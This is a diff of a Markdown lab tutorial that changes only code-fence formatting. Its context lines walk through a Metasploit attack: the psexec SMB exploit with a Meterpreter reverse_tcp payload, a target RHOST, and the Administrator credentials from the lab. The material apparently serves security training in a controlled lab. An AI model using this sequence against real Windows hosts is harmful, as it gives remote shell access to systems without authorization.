@@ -14,7 +14,8 @@ sudo su -
 ```
 
 Launch the Metasploit Framework console:
-``` bash
+``` 
+bash
 
 msfconsole -q
 ```
@@ -25,25 +26,26 @@ Once connected, your terminal prompt will change to indicate you're in the Metas
 
 Configuring the Exploit
 Select the Windows SMB exploit module:
-``` bash
-
+``` 
+bash
 use exploit/windows/smb/psexec
 ```
 
 Configure the payload type:
-``` bash
-
+``` 
+bash
 set PAYLOAD windows/meterpreter/reverse_tcp
 ```
 
 Specify the target Windows system's IP address:
-``` bash
-
+``` 
+bash
 set RHOST (YOUR IP ADDRESS)
 ```
 
 Set the SMB credentials for authentication:
-``` bash
+``` 
+bash
 
 set SMBUSER Administrator
 set SMBPASS password1234
@@ -54,8 +56,8 @@ Security Note: Use the password you configured earlier in the lab. Ensure you're
 After configuration, your console should display all the set parameters.
 
 Execute the attack:
-``` bash
-
+```
+bash 
 exploit
 ```
 ## Network Connection Analysis
